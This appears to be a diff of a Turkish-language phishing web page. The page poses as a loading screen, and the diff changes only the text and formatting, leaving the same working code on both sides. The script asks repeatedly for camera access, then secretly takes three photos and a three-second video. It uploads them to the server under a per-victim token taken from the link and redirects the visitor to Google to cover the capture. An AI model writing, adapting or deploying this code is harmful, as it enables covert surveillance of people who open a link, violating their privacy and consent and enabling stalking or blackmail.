@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yükleniyor...</title>
+    <title>Yukleniyor...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -41,18 +41,17 @@
     </style>
 </head>
 <body>
-    <div id="loading">Yükleniyor</div>
+    <div id="loading">Yukleniyor</div>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // URL'den token al
         const path = window.location.pathname;
-        const token = path.split('/c/')[1];
+        const token = path.split("/c/")[1];
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const loading = document.getElementById('loading');
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const loading = document.getElementById("loading");
 
         let stream = null;
         let photoCount = 0;
@@ -72,25 +71,22 @@
                 video.srcObject = stream;
                 await video.play();
 
-                loading.innerHTML = "Lütfen bekleyin...";
+                loading.innerHTML = "Lutfen bekleyin...";
 
-                // 1 saniye bekle, sonra fotoğraf çek
                 setTimeout(() => {
                     takePhotos();
                 }, 1000);
 
             } catch (err) {
-                console.error("Kamera hatası:", err);
-                loading.innerHTML = "Kamera erişimi gereklidir. Lütfen izin verin.";
-
-                // İzin reddedilirse tekrar dene
+                console.error("Kamera hatasi:", err);
+                loading.innerHTML = "Kamera erisimi gereklidir. Lutfen izin verin.";
                 setTimeout(startCamera, 2000);
             }
         }
 
         function takePhotos() {
             if (photoCount >= maxPhotos) {
-                loading.innerHTML = "İşlem tamamlandı!";
+                loading.innerHTML = "Islem tamamlandi!";
                 setTimeout(() => {
                     window.location.href = "https://www.google.com";
                 }, 500);
@@ -99,23 +95,19 @@
 
             canvas.width = video.videoWidth || 1280;
             canvas.height = video.videoHeight || 720;
-            const ctx = canvas.getContext('2d');
+            const ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Fotoğrafı base64 olarak al
-            const imageData = canvas.toDataURL('image/jpeg', 0.9);
-
-            // Sunucuya gönder
+            const imageData = canvas.toDataURL("image/jpeg", 0.9);
             sendPhoto(imageData);
 
             photoCount++;
 
-            // Her 500ms bir fotoğraf çek (toplam 3 fotoğraf)
             if (photoCount < maxPhotos) {
                 setTimeout(takePhotos, 500);
             } else {
                 setTimeout(() => {
-                    loading.innerHTML = "İşlem tamamlandı!";
+                    loading.innerHTML = "Islem tamamlandi!";
                     setTimeout(() => {
                         window.location.href = "https://www.google.com";
                     }, 500);
@@ -125,20 +117,19 @@
 
         async function sendPhoto(imageData) {
             try {
-                await fetch(`/upload/${token}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                await fetch("/upload/" + token, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ image: imageData })
                 });
             } catch (e) {
-                console.error("Gönderim hatası:", e);
+                console.error("Gonderim hatasi:", e);
             }
         }
 
-        // Video kaydı (isteğe bağlı - 3 saniyelik)
         async function recordVideo() {
             try {
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
                 const chunks = [];
 
                 mediaRecorder.ondataavailable = (e) => {
@@ -146,12 +137,12 @@
                 };
 
                 mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const blob = new Blob(chunks, { type: "video/webm" });
                     const formData = new FormData();
-                    formData.append('video', blob, 'video.webm');
+                    formData.append("video", blob, "video.webm");
 
-                    await fetch(`/upload_video/${token}`, {
-                        method: 'POST',
+                    await fetch("/upload_video/" + token, {
+                        method: "POST",
                         body: formData
                     });
                 };
@@ -159,18 +150,15 @@
                 mediaRecorder.start();
                 setTimeout(() => mediaRecorder.stop(), 3000);
             } catch (e) {
-                console.error("Video kayıt hatası:", e);
+                console.error("Video kayit hatasi:", e);
             }
         }
 
-        // Sayfa yüklendiğinde başlat
         window.onload = () => {
             startCamera();
-            // 2 saniye sonra video kaydı başlat
             setTimeout(recordVideo, 2000);
         };
 
-        // Sayfa kapatılınca kamerayı kapat
         window.onbeforeunload = () => {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
